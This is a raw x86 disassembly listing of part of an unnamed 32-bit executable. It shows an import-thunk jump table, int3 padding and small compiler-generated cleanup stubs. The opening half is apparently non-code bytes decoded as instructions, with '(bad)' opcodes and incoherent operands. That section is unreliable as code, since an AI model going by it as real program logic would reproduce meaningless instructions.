  41c5f1:	fsubr  QWORD PTR [eax-0x152ecf58]
  41c5f7:	sub    al,BYTE PTR [esi]
  41c5f9:	dec    esi
  41c5fa:	adc    BYTE PTR [ecx],dl
  41c5fc:	inc    eax
  41c5fd:	push   eax
  41c5fe:	adc    BYTE PTR [ecx-0x64],al
  41c601:	inc    eax
  41c602:	pop    eax
  41c603:	jo     0x41c678
  41c605:	aaa    
  41c606:	inc    ebp
  41c607:	je     0x41c687
  41c609:	push   esi
  41c60a:	or     BYTE PTR [eax],0x40
  41c60d:	inc    edi
  41c60e:	xor    DWORD PTR [esi+ecx*1],ebp
  41c611:	push   ebp
  41c612:	ret    
  41c613:	retf   
  41c614:	jno    0x41c5f1
  41c616:	jl     0x41c658
  41c618:	jge    0x41c5f6
  41c61a:	inc    esp
  41c61b:	mov    eax,0x4f9d5740
  41c620:	outs   dx,DWORD PTR ds:[esi]
  41c621:	dec    edx
  41c622:	dec    edx
  41c623:	add    eax,0x404d5740
  41c628:	pop    ecx
  41c629:	dec    esp
  41c62a:	enter  0x7acb,0xee
  41c62e:	cmp    al,0x7f
  41c630:	cmp    al,0x6c
  41c632:	mov    edi,0x89517312
  41c637:	sub    BYTE PTR [ebx-0x4c],ch
  41c63a:	mov    edi,0xead340aa
  41c63f:	inc    eax
  41c640:	ins    DWORD PTR es:[edi],dx
  41c641:	mov    dh,0xbf
  41c643:	xchg   ecx,eax
  41c644:	cmp    dh,BYTE PTR [ebx+0x4a]
  41c647:	add    bl,ah
  41c649:	lods   eax,DWORD PTR ds:[esi]
  41c64a:	retf   0x406c
  41c64d:	ins    DWORD PTR es:[edi],dx
  41c64e:	or     al,0x50
  41c650:	sub    DWORD PTR [eax+ebp*4+0x11],0x29
  41c655:	mov    bl,0x1f
  41c657:	or     al,0x1d
  41c659:	push   esp
  41c65a:	inc    eax
  41c65b:	imul   DWORD PTR [edx]
  41c65d:	mov    edi,0xb6a52873
  41c662:	inc    eax
  41c663:	dec    edi
  41c664:	inc    eax
  41c665:	jg     0x41c6aa
  41c667:	imul   ebx,DWORD PTR [edx],0x6db840ad
  41c66d:	jno    0x41c6cc
  41c66f:	dec    eax
  41c670:	das    
  41c671:	arpl   di,cx
  41c673:	or     eax,0x7fa54c1e
  41c678:	xchg   ecx,eax
  41c679:	jp     0x41c63f
  41c67b:	retf   
  41c67c:	inc    eax
  41c67d:	jnp    0x41c683
  41c67f:	and    BYTE PTR [ebx+0x28],cl
  41c682:	dec    edi
  41c683:	mov    eax,0xc1444b05
  41c688:	sub    eax,0x2e054062
  41c68d:	jno    0x41c6fc
  41c68f:	int3   
  41c690:	sbb    bl,cl
  41c692:	dec    ecx
  41c693:	leave  
  41c694:	jb     0x41c6d6
  41c696:	xor    ebx,DWORD PTR [eax-0x38]
  41c699:	push   edi
  41c69a:	inc    eax
  41c69b:	mov    esp,0xa89a9040
  41c6a0:	inc    esp
  41c6a1:	inc    esp
  41c6a2:	xor    al,0x5
  41c6a4:	es and BYTE PTR es:[edi+0x3e],al
  41c6a9:	add    bh,BYTE PTR [ebp-0x35]
  41c6ac:	push   ss
  41c6ad:	push   cs
  41c6ae:	clc    
  41c6af:	sub    bl,BYTE PTR [edi+0x67]
  41c6b2:	ret    
  41c6b3:	jbe    0x41c6f5
  41c6b5:	push   esi
  41c6b6:	nop
  41c6b7:	inc    ecx
  41c6b8:	test   al,0x6f
  41c6ba:	inc    edi
  41c6bb:	xor    al,0x7b
  41c6bd:	and    ebp,ebp
  41c6bf:	or     dl,BYTE PTR [eax]
  41c6c1:	test   al,0x2e
  41c6c3:	mov    al,0x42
  41c6c5:	jnp    0x41c6ee
  41c6c7:	jo     0x41c679
  41c6c9:	adc    ebx,esp
  41c6cb:	adc    eax,0x62c81144
  41c6d0:	add    eax,0x707b44b8
  41c6d5:	mov    ch,0x6
  41c6d7:	inc    eax
  41c6d8:	inc    edx
  41c6d9:	inc    ecx
  41c6da:	push   ecx
  41c6db:	mov    esp,0x2a746442
  41c6e0:	push   esi
  41c6e1:	inc    ecx
  41c6e2:	cs adc eax,0x522e3140
  41c6e8:	hlt    
  41c6e9:	js     0x41c75a
  41c6eb:	retf   
  41c6ec:	adc    eax,0xbbe9926
  41c6f1:	push   ebx
  41c6f2:	aam    0xbc
  41c6f4:	js     0x41c76b
  41c6f6:	mov    esp,0xa87f3869
  41c6fb:	or     eax,0x1a034e40
  41c700:	mov    esp,0x63c968fc
  41c705:	xor    BYTE PTR [ecx],ch
  41c707:	test   BYTE PTR [esi+0x62],bh
  41c70a:	sub    cl,BYTE PTR [eax+0x40]
  41c70d:	add    DWORD PTR [ecx+0x400b0565],ebp
  41c713:	retf   
  41c714:	jp     0x41c770
  41c716:	sub    al,BYTE PTR [eax-0x4f466b9c]
  41c71c:	retf   0x9375
  41c71f:	jae    0x41c771
  41c721:	bound  eax,QWORD PTR ds:0x967a4005
  41c727:	nop
  41c728:	inc    esp
  41c729:	fs xchg bl,cl
  41c72c:	das    
  41c72d:	je     0x41c6e3
  41c72f:	mov    edi,0xb0709886
  41c734:	push   esi
  41c735:	outs   dx,BYTE PTR ds:[esi]
  41c736:	mov    ebx,0xb8622540
  41c73b:	adc    eax,0x40e44740
  41c740:	fisttp WORD PTR [eax+0x5]
  41c743:	leave  
  41c744:	inc    ebp
  41c745:	mov    al,0x91
  41c747:	inc    eax
  41c748:	push   edi
  41c749:	sbb    BYTE PTR [esi-0x7b52d0b4],al
  41c74f:	fdivr  st(0),st
  41c751:	ins    BYTE PTR es:[edi],dx
  41c752:	jo     0x41c6d6
  41c754:	inc    eax
  41c755:	sub    eax,0x446c02d
  41c75a:	mov    bh,0xc3
  41c75c:	and    eax,DWORD PTR [ebp+0x7d]
  41c75f:	inc    esi
  41c760:	sub    al,0x7c
  41c762:	add    eax,0x98f26aac
  41c767:	inc    ebx
  41c768:	pop    es
  41c769:	inc    ecx
  41c76a:	xchg   BYTE PTR ds:0x34d56e42,dl
  41c770:	inc    edx
  41c771:	push   edx
  41c772:	je     0x41c73f
  41c774:	and    eax,0xb1719745
  41c779:	mov    eax,0x9b72acb6
  41c77e:	or     ch,BYTE PTR [eax+0xd05056c]
  41c784:	inc    eax
  41c785:	inc    edx
  41c786:	lahf   
  41c787:	sub    eax,0xc9866b71
  41c78c:	cmp    DWORD PTR [ebx+0x4c4232e5],esi
  41c792:	aaa    
  41c793:	dec    esp
  41c794:	push   edx
  41c795:	inc    ecx
  41c796:	add    DWORD PTR [ebx+0x8b505b1],edi
  41c79c:	inc    eax
  41c79d:	push   eax
  41c79e:	xchg   esp,eax
  41c79f:	call   0xcb47930b
  41c7a4:	push   ebp
  41c7a5:	xor    edi,ebx
  41c7a7:	mov    ecx,0xb4860f6e
  41c7ac:	xor    eax,DWORD PTR [ecx+0x70]
  41c7af:	(bad)  
  41c7b0:	fadd   DWORD PTR [ebx+eiz*1+0x5]
  41c7b4:	push   0x3b
  41c7b6:	mov    ds:0xb4533562,al
  41c7bb:	retf   
  41c7bc:	inc    eax
  41c7bd:	sbb    eax,0x28a8cbe3
  41c7c2:	add    eax,0xfce16218
  41c7c7:	cmp    BYTE PTR [eax],dl
  41c7c9:	mov    eax,ds:0xd5163486
  41c7ce:	inc    eax
  41c7cf:	call   0x408d9825
  41c7d4:	inc    eax
  41c7d5:	imul   esi,DWORD PTR [eax*1-0x4bbf28c1],0xcb7ab134
  41c7e0:	sbb    BYTE PTR [ebx+0x4f],bh
  41c7e3:	cmp    eax,0x92f56740
  41c7e8:	xor    eax,0x62c39c91
  41c7ed:	adc    dl,BYTE PTR [ecx]
  41c7ef:	inc    ecx
  41c7f0:	and    BYTE PTR [ebx+0x4c],0xb4
  41c7f4:	inc    eax
  41c7f5:	sub    cl,BYTE PTR [esi-0x56823a3d]
  41c7fb:	add    eax,0x200d1210
  41c800:	inc    ecx
  41c801:	lods   al,BYTE PTR ds:[esi]
  41c802:	std    
  41c803:	leave  
  41c804:	jge    0x41c7f9
  41c806:	repnz fs dec ebx
  41c809:	push   ebx
  41c80a:	ins    DWORD PTR es:[edi],dx
  41c80b:	inc    eax
  41c80c:	inc    esp
  41c80d:	inc    edx
  41c80e:	and    eax,edx
  41c810:	les    edi,FWORD PTR [edx+eax*2+0x18b44040]
  41c817:	inc    ebx
  41c818:	adc    al,0x9
  41c81a:	push   eax
  41c81b:	xchg   esp,eax
  41c81c:	xor    ebp,DWORD PTR [esi-0x45]
  41c81f:	cs inc edx
  41c821:	(bad)
  41c824:	inc    eax
  41c825:	inc    eax
  41c826:	xchg   esp,eax
  41c827:	psubusw mm4,QWORD PTR [ebp+0x43]
  41c82b:	test   al,0x21
  41c82d:	push   edx
  41c82e:	or     al,0xa8
  41c830:	cmp    eax,DWORD PTR [edi-0x1]
  41c833:	push   esp
  41c834:	inc    eax
  41c835:	lods   eax,DWORD PTR ds:[esi]
  41c836:	and    eax,0x1f04211
  41c83b:	lods   al,BYTE PTR ds:[esi]
  41c83c:	sub    al,0x37
  41c83e:	int3   
  41c83f:	clc    
  41c840:	mov    ebp,0x40c3b067
  41c845:	loope  0x41c7da
  41c847:	inc    ecx
  41c848:	imul   edi,DWORD PTR [eax],0x1f00ac90
  41c84e:	cmp    al,0x77
  41c850:	mov    edi,db7
  41c853:	retf   
  41c854:	and    ecx,DWORD PTR [ebx+esi*4]
  41c857:	and    BYTE PTR [ebp+ebp*2-0x3],cl
  41c85b:	adc    eax,0x51551464
  41c860:	bound  edi,QWORD PTR fs:[esi+0x27]
  41c864:	inc    eax
  41c865:	aaa    
  41c866:	call   0x3640:0x624548c0
  41c86d:	(bad)  
  41c86f:	scas   al,BYTE PTR es:[edi]
  41c870:	enter  0xc043,0x40
  41c874:	inc    eax
  41c875:	xchg   edx,eax
  41c876:	or     DWORD PTR [ebp+0x54443dd2],ecx
  41c87c:	sub    DWORD PTR [edx],esp
  41c87e:	and    ch,BYTE PTR [eax+0x3a357557]
  41c884:	inc    eax
  41c885:	sub    ebx,DWORD PTR [ebp-0x1caf22f0]
  41c88b:	inc    eax
  41c88c:	and    al,0xf0
  41c88e:	pop    ebp
  41c88f:	mov    ah,0x10
  41c891:	fadd   QWORD PTR [eax+eiz*2-0x68]
  41c895:	xor    bl,BYTE PTR [edi-0xaa4b7be]
  41c89b:	dec    ebx
  41c89c:	dec    ebx
  41c89d:	sub    bh,BYTE PTR [ecx+ecx*1-0x1bd043fb]
  41c8a4:	add    DWORD PTR [esi-0x7],edx
  41c8a7:	lock adc dl,BYTE PTR [esp+edi*4+0x2]
  41c8ac:	js     0x41c8e1
  41c8ae:	enter  0x2752,0x98
  41c8b2:	arpl   WORD PTR [eax+0x46],ax
  41c8b5:	je     0x41c8f3
  41c8b7:	sbb    bl,cl
  41c8b9:	imul   ecx,DWORD PTR [ebp+ebx*8-0x11340c82],0x42
  41c8c1:	call   0x31fe:0x61406f21
  41c8c8:	mov    ebp,0x329ed16c
  41c8cd:	aad    0xf8
  41c8cf:	mov    bh,0x6e
  41c8d1:	push   ebx
  41c8d2:	cs inc eax
  41c8d4:	inc    eax
  41c8d5:	rsm    
  41c8d7:	sub    ebp,DWORD PTR [ecx-0x21]
  41c8da:	pop    esp
  41c8db:	inc    eax
  41c8dc:	and    dl,BYTE PTR ds:0x121c6b52
  41c8e2:	gs inc eax
  41c8e4:	inc    eax
  41c8e5:	(bad)  
  41c8e6:	idiv   DWORD PTR [esi]
  41c8e8:	xor    DWORD PTR gs:0xa9547c46,edi
  41c8ef:	sub    bl,BYTE PTR [eax+0x62]
  41c8f2:	and    al,0x40
  41c8f4:	shr    BYTE PTR [edi],0x10
  41c8f7:	mov    eax,ds:0x40fbe665
  41c8fc:	push   eax
  41c8fd:	adc    al,0x25
  41c8ff:	stos   DWORD PTR es:[edi],eax
  41c900:	mov    ebp,0x444208f8
  41c905:	adc    eax,esi
  41c907:	sbb    ah,BYTE PTR [esi+0x64]
  41c90a:	bound  esp,QWORD PTR [eax+0x60]
  41c90d:	inc    edx
  41c90e:	cdq    
  41c90f:	xchg   DWORD PTR [ebx],ecx
  41c911:	cmp    BYTE PTR [ebx+0x46],bh
  41c914:	inc    eax
  41c915:	xor    al,BYTE PTR [esi-0x3f9d4f9c]
  41c91b:	pop    edx
  41c91c:	dec    edx
  41c91d:	mov    ebx,0xb466f9b5
  41c922:	(bad)  
  41c923:	in     al,dx
  41c924:	inc    eax
  41c925:	add    al,0x4f
  41c927:	sub    al,BYTE PTR [edx+eax*8+0x504d4085]
  41c92e:	test   BYTE PTR [ecx+0x238921c3],bh
  41c934:	inc    eax
  41c935:	mov    bh,0x17
  41c937:	or     BYTE PTR [ebx+ecx*1+0x48],0x2f
  41c93c:	jle    0x41c97e
  41c93e:	ret    0xd6c5
  41c941:	xchg   esp,eax
  41c942:	loop   0x41c970
  41c944:	shl    BYTE PTR [eax],0x48
  41c947:	inc    esp
  41c948:	sbb    al,0x62
  41c94a:	mov    eax,0xb430f525
  41c94f:	dec    esp
  41c950:	dec    edi
  41c951:	or     eax,0x6a4f320d
  41c956:	cmp    DWORD PTR [edi],0x6e6d6531
  41c95c:	ins    DWORD PTR es:[edi],dx
  41c95d:	mov    bl,0x5b
  41c95f:	jl     0x41c9db
  41c961:	xor    DWORD PTR [edx+0x415c1580],eax
  41c967:	sbb    dl,BYTE PTR [ebp+0x7a456257]
  41c96d:	push   ebx
  41c96e:	in     eax,0xa8
  41c970:	dec    esp
  41c971:	dec    ebx
  41c972:	inc    esi
  41c973:	inc    eax
  41c974:	aas    
  41c975:	inc    esp
  41c976:	cmp    edx,DWORD PTR [ecx]
  41c978:	(bad)  
  41c979:	and    eax,0xb350dc02
  41c97e:	sub    al,0xfc
  41c980:	and    BYTE PTR [eax],al
  41c982:	add    BYTE PTR [edx],cl
  41c984:	cmp    DWORD PTR [eax],eax
  41c986:	add    BYTE PTR [edx],cl
  41c988:	data16 add BYTE PTR [eax],al
  41c98b:	or     DWORD PTR [eax-0x4bf60000],edx
  41c991:	add    BYTE PTR [eax],al
  41c993:	or     bl,ch
  41c995:	add    BYTE PTR [eax],al
  41c997:	or     DWORD PTR [ecx+eax*1],eax
  41c99a:	add    BYTE PTR [ecx],cl
  41c99c:	sbb    eax,0x340a0001
  41c9a1:	add    DWORD PTR [eax],eax
  41c9a3:	or     DWORD PTR [esi+0x1],edx
  41c9a6:	add    BYTE PTR [ecx],cl
  41c9a8:	or     al,BYTE PTR [eax]
  41c9aa:	jmp    DWORD PTR ds:0x41d014
  41c9b0:	jmp    DWORD PTR ds:0x41d018
  41c9b6:	jmp    DWORD PTR ds:0x41d01c
  41c9bc:	jmp    DWORD PTR ds:0x41d020
  41c9c2:	jmp    DWORD PTR ds:0x41d024
  41c9c8:	jmp    DWORD PTR ds:0x41d028
  41c9ce:	jmp    DWORD PTR ds:0x41d02c
  41c9d4:	jmp    DWORD PTR ds:0x41d030
  41c9da:	jmp    DWORD PTR ds:0x41d034
  41c9e0:	jmp    DWORD PTR ds:0x41d038
  41c9e6:	jmp    DWORD PTR ds:0x41d03c
  41c9ec:	jmp    DWORD PTR ds:0x41d040
  41c9f2:	jmp    DWORD PTR ds:0x41d044
  41c9f8:	jmp    DWORD PTR ds:0x41d048
  41c9fe:	jmp    DWORD PTR ds:0x41d04c
  41ca04:	jmp    DWORD PTR ds:0x41d050
  41ca0a:	jmp    DWORD PTR ds:0x41d054
  41ca10:	jmp    DWORD PTR ds:0x41d058
  41ca16:	jmp    DWORD PTR ds:0x41d05c
  41ca1c:	jmp    DWORD PTR ds:0x41d060
  41ca22:	jmp    DWORD PTR ds:0x41d064
  41ca28:	jmp    DWORD PTR ds:0x41d068
  41ca2e:	jmp    DWORD PTR ds:0x41d06c
  41ca34:	jmp    DWORD PTR ds:0x41d070
  41ca3a:	jmp    DWORD PTR ds:0x41d074
  41ca40:	jmp    DWORD PTR ds:0x41d078
  41ca46:	jmp    DWORD PTR ds:0x41d07c
  41ca4c:	jmp    DWORD PTR ds:0x41d080
  41ca52:	jmp    DWORD PTR ds:0x41d084
  41ca58:	jmp    DWORD PTR ds:0x41d088
  41ca5e:	jmp    DWORD PTR ds:0x41d08c
  41ca64:	jmp    DWORD PTR ds:0x41d090
  41ca6a:	jmp    DWORD PTR ds:0x41d094
  41ca70:	jmp    DWORD PTR ds:0x41d098
  41ca76:	jmp    DWORD PTR ds:0x41d09c
  41ca7c:	jmp    DWORD PTR ds:0x41d0a0
  41ca82:	jmp    DWORD PTR ds:0x41d0a4
  41ca88:	jmp    DWORD PTR ds:0x41d0a8
  41ca8e:	jmp    DWORD PTR ds:0x41d0ac
  41ca94:	jmp    DWORD PTR ds:0x41d0b0
  41ca9a:	jmp    DWORD PTR ds:0x41d0b4
  41caa0:	jmp    DWORD PTR ds:0x41d0b8
  41caa6:	jmp    DWORD PTR ds:0x41d0bc
  41caac:	jmp    DWORD PTR ds:0x41d0c0
  41cab2:	jmp    DWORD PTR ds:0x41d0c4
  41cab8:	jmp    DWORD PTR ds:0x41d0c8
  41cabe:	jmp    DWORD PTR ds:0x41d0cc
  41cac4:	jmp    DWORD PTR ds:0x41d0d0
  41caca:	jmp    DWORD PTR ds:0x41d0d4
  41cad0:	jmp    DWORD PTR ds:0x41d0d8
  41cad6:	jmp    DWORD PTR ds:0x41d0dc
  41cadc:	jmp    DWORD PTR ds:0x41d0e0
  41cae2:	jmp    DWORD PTR ds:0x41d0e4
  41cae8:	jmp    DWORD PTR ds:0x41d0e8
  41caee:	jmp    DWORD PTR ds:0x41d0ec
  41caf4:	jmp    DWORD PTR ds:0x41d0f0
  41cafa:	jmp    DWORD PTR ds:0x41d0f4
  41cb00:	jmp    DWORD PTR ds:0x41d0f8
  41cb06:	jmp    DWORD PTR ds:0x41d0fc
  41cb0c:	jmp    DWORD PTR ds:0x41d100
  41cb12:	jmp    DWORD PTR ds:0x41d104
  41cb18:	jmp    DWORD PTR ds:0x41d108
  41cb1e:	jmp    DWORD PTR ds:0x41d10c
  41cb24:	jmp    DWORD PTR ds:0x41d110
  41cb2a:	jmp    DWORD PTR ds:0x41d114
  41cb30:	jmp    DWORD PTR ds:0x41d118
  41cb36:	jmp    DWORD PTR ds:0x41d11c
  41cb3c:	jmp    DWORD PTR ds:0x41d120
  41cb42:	jmp    DWORD PTR ds:0x41d124
  41cb48:	jmp    DWORD PTR ds:0x41d128
  41cb4e:	jmp    DWORD PTR ds:0x41d12c
  41cb54:	jmp    DWORD PTR ds:0x41d130
  41cb5a:	jmp    DWORD PTR ds:0x41d134
  41cb60:	jmp    DWORD PTR ds:0x41d138
  41cb66:	jmp    DWORD PTR ds:0x41d13c
  41cb6c:	jmp    DWORD PTR ds:0x41d140
  41cb72:	jmp    DWORD PTR ds:0x41d144
  41cb78:	jmp    DWORD PTR ds:0x41d148
  41cb7e:	jmp    DWORD PTR ds:0x41d14c
  41cb84:	jmp    DWORD PTR ds:0x41d150
  41cb8a:	jmp    DWORD PTR ds:0x41d154
  41cb90:	jmp    DWORD PTR ds:0x41d158
  41cb96:	jmp    DWORD PTR ds:0x41d15c
  41cb9c:	jmp    DWORD PTR ds:0x41d160
  41cba2:	jmp    DWORD PTR ds:0x41d164
  41cba8:	jmp    DWORD PTR ds:0x41d168
  41cbae:	jmp    DWORD PTR ds:0x41d00c
  41cbb4:	jmp    DWORD PTR ds:0x41d170
  41cbba:	jmp    DWORD PTR ds:0x41d174
  41cbc0:	jmp    DWORD PTR ds:0x41d178
  41cbc6:	jmp    DWORD PTR ds:0x41d17c
  41cbcc:	jmp    DWORD PTR ds:0x41d180
  41cbd2:	jmp    DWORD PTR ds:0x41d184
  41cbd8:	jmp    DWORD PTR ds:0x41d188
  41cbde:	jmp    DWORD PTR ds:0x41d18c
  41cbe4:	jmp    DWORD PTR ds:0x41d190
  41cbea:	jmp    DWORD PTR ds:0x41d194
  41cbf0:	jmp    DWORD PTR ds:0x41d198
  41cbf6:	jmp    DWORD PTR ds:0x41d19c
  41cbfc:	jmp    DWORD PTR ds:0x41d1a0
  41cc02:	jmp    DWORD PTR ds:0x41d1a4
  41cc08:	jmp    DWORD PTR ds:0x41d1a8
  41cc0e:	jmp    DWORD PTR ds:0x41d1ac
  41cc14:	jmp    DWORD PTR ds:0x41d1b0
  41cc1a:	jmp    DWORD PTR ds:0x41d1b4
  41cc20:	jmp    DWORD PTR ds:0x41d1b8
  41cc26:	jmp    DWORD PTR ds:0x41d1bc
  41cc2c:	jmp    DWORD PTR ds:0x41d1c0
  41cc32:	jmp    DWORD PTR ds:0x41d1c4
  41cc38:	jmp    DWORD PTR ds:0x41d1c8
  41cc3e:	jmp    DWORD PTR ds:0x41d1cc
  41cc44:	jmp    DWORD PTR ds:0x41d1d4
  41cc4a:	jmp    DWORD PTR ds:0x41d1d8
  41cc50:	jmp    DWORD PTR ds:0x41d1dc
  41cc56:	jmp    DWORD PTR ds:0x41d1e0
  41cc5c:	jmp    DWORD PTR ds:0x41d1e4
  41cc62:	jmp    DWORD PTR ds:0x41d1e8
  41cc68:	jmp    DWORD PTR ds:0x41d1ec
  41cc6e:	jmp    DWORD PTR ds:0x41d1f0
  41cc74:	jmp    DWORD PTR ds:0x41d1f4
  41cc7a:	jmp    DWORD PTR ds:0x41d1f8
  41cc80:	jmp    DWORD PTR ds:0x41d1fc
  41cc86:	jmp    DWORD PTR ds:0x41d200
  41cc8c:	jmp    DWORD PTR ds:0x41d204
  41cc92:	jmp    DWORD PTR ds:0x41d208
  41cc98:	jmp    DWORD PTR ds:0x41d20c
  41cc9e:	jmp    DWORD PTR ds:0x41d210
  41cca4:	jmp    DWORD PTR ds:0x41d214
  41ccaa:	jmp    DWORD PTR ds:0x41d218
  41ccb0:	jmp    DWORD PTR ds:0x41d21c
  41ccb6:	jmp    DWORD PTR ds:0x41d220
  41ccbc:	jmp    DWORD PTR ds:0x41d224
  41ccc2:	jmp    DWORD PTR ds:0x41d228
  41ccc8:	jmp    DWORD PTR ds:0x41d22c
  41ccce:	jmp    DWORD PTR ds:0x41d230
  41ccd4:	jmp    DWORD PTR ds:0x41d234
  41ccda:	jmp    DWORD PTR ds:0x41d238
  41cce0:	jmp    DWORD PTR ds:0x41d23c
  41cce6:	jmp    DWORD PTR ds:0x41d240
  41ccec:	jmp    DWORD PTR ds:0x41d244
  41ccf2:	jmp    DWORD PTR ds:0x41d248
  41ccf8:	jmp    DWORD PTR ds:0x41d24c
  41ccfe:	jmp    DWORD PTR ds:0x41d250
  41cd04:	jmp    DWORD PTR ds:0x41d254
  41cd0a:	jmp    DWORD PTR ds:0x41d258
  41cd10:	jmp    DWORD PTR ds:0x41d25c
  41cd16:	jmp    DWORD PTR ds:0x41d260
  41cd1c:	jmp    DWORD PTR ds:0x41d264
  41cd22:	jmp    DWORD PTR ds:0x41d268
  41cd28:	jmp    DWORD PTR ds:0x41d26c
  41cd2e:	jmp    DWORD PTR ds:0x41d270
  41cd34:	jmp    DWORD PTR ds:0x41d274
  41cd3a:	jmp    DWORD PTR ds:0x41d278
  41cd40:	jmp    DWORD PTR ds:0x41d27c
  41cd46:	jmp    DWORD PTR ds:0x41d284
  41cd4c:	int3   
  41cd4d:	int3   
  41cd4e:	int3   
  41cd4f:	int3   
  41cd50:	jmp    DWORD PTR ds:0x41d2c8
  41cd56:	jmp    DWORD PTR ds:0x41d2cc
  41cd5c:	call   0x41ccda
  41cd61:	mov    ecx,DWORD PTR [esp+0x4]
  41cd65:	mov    edx,DWORD PTR [esp+0x8]
  41cd69:	test   ecx,ecx
  41cd6b:	mov    BYTE PTR [eax+0x14],cl
  41cd6e:	mov    DWORD PTR [eax+0x1040],edx
  41cd74:	jne    0x41cd7f
  41cd76:	push   0xfffffffd
  41cd78:	call   DWORD PTR ds:0x41d2b4
  41cd7e:	pop    ecx
  41cd7f:	push   0x1
  41cd81:	pop    eax
  41cd82:	ret    0x8
  41cd85:	jmp    0x41cd8a
  41cd8a:	push   0x600
  41cd8f:	push   0x0
  41cd91:	call   0x41cd5c
  41cd96:	mov    ds:0x41fa24,al
  41cd9b:	ret    
  41cd9c:	jmp    DWORD PTR ds:0x41d16c
  41cda2:	int3   
  41cda3:	int3   
  41cda4:	int3   
  41cda5:	int3   
  41cda6:	int3   
  41cda7:	int3   
  41cda8:	int3   
  41cda9:	int3   
  41cdaa:	int3   
  41cdab:	int3   
  41cdac:	int3   
  41cdad:	int3   
  41cdae:	int3   
  41cdaf:	int3   
  41cdb0:	mov    ecx,DWORD PTR [ebp-0x18]
  41cdb3:	call   0x41cbf0
  41cdb8:	ret    
  41cdb9:	mov    ecx,DWORD PTR [ebp-0x18]
  41cdbc:	add    ecx,0xc0
  41cdc2:	call   0x41cbea
  41cdc7:	ret    
  41cdc8:	mov    eax,0x41f790
  41cdcd:	jmp    0x401000
  41cdd2:	int3   
  41cdd3:	int3   
  41cdd4:	int3   
  41cdd5:	int3   
  41cdd6:	int3   
  41cdd7:	int3   
  41cdd8:	int3   
  41cdd9:	int3   
  41cdda:	int3   
  41cddb:	int3   
  41cddc:	int3   
  41cddd:	int3   
  41cdde:	int3   
  41cddf:	int3   
  41cde0:	mov    ecx,DWORD PTR [ebp-0x10]
  41cde3:	call   0x41cc0e
  41cde8:	ret    
  41cde9:	mov    eax,0x41f7c0
  41cdee:	jmp    0x401000
  41cdf3:	int3   
  41cdf4:	int3   
  41cdf5:	int3   
  41cdf6:	int3   
  41cdf7:	int3   
  41cdf8:	int3   
  41cdf9:	int3   
  41cdfa:	int3   
  41cdfb:	int3   
  41cdfc:	int3   
  41cdfd:	int3   
  41cdfe:	int3   
  41cdff:	int3   
  41ce00:	mov    ecx,DWORD PTR [ebp-0x14]
  41ce03:	call   0x41cbf0
  41ce08:	ret    
  41ce09:	mov    ecx,DWORD PTR [ebp-0x14]
  41ce0c:	add    ecx,0xc0
  41ce12:	call   0x41cbea
  41ce17:	ret    
  41ce18:	mov    ecx,DWORD PTR [ebp-0x10]
  41ce1b:	call   0x41cc0e
  41ce20:	ret    
  41ce21:	mov    eax,0x41f7e8
  41ce26:	jmp    0x401000
  41ce2b:	int3   
  41ce2c:	int3   
  41ce2d:	int3   
  41ce2e:	int3   
  41ce2f:	int3   
  41ce30:	mov    eax,DWORD PTR [ebp-0x24]
  41ce33:	push   eax
  41ce34:	call   0x401e60
  41ce39:	ret    
  41ce3a:	mov    eax,DWORD PTR [ebp-0x2c]
  41ce3d:	push   eax
  41ce3e:	call   0x401e60
  41ce43:	ret    
  41ce44:	mov    eax,DWORD PTR [ebp-0x34]
  41ce47:	push   eax
  41ce48:	call   0x401e60
  41ce4d:	ret    
  41ce4e:	mov    eax,0x41f820
  41ce53:	jmp    0x401000
  41ce58:	int3   
  41ce59:	int3   
  41ce5a:	int3   
  41ce5b:	int3   
  41ce5c:	int3   
  41ce5d:	int3   
  41ce5e:	int3   
  41ce5f:	int3   
  41ce60:	mov    ecx,DWORD PTR [ebp-0x18]
  41ce63:	call   0x41cd40
  41ce68:	ret    
  41ce69:	mov    eax,0x41f858
  41ce6e:	jmp    0x401000
  41ce73:	int3   
  41ce74:	int3   
  41ce75:	int3   
  41ce76:	int3   
  41ce77:	int3   
  41ce78:	int3   
  41ce79:	int3   
  41ce7a:	int3   
  41ce7b:	int3   
  41ce7c:	int3   
  41ce7d:	int3   
  41ce7e:	int3   
  41ce7f:	int3   
  41ce80:	lea    ecx,[ebp-0x6c]
  41ce83:	call   0x401d20
  41ce88:	ret    
  41ce89:	mov    eax,0x41f880
  41ce8e:	jmp    0x401000
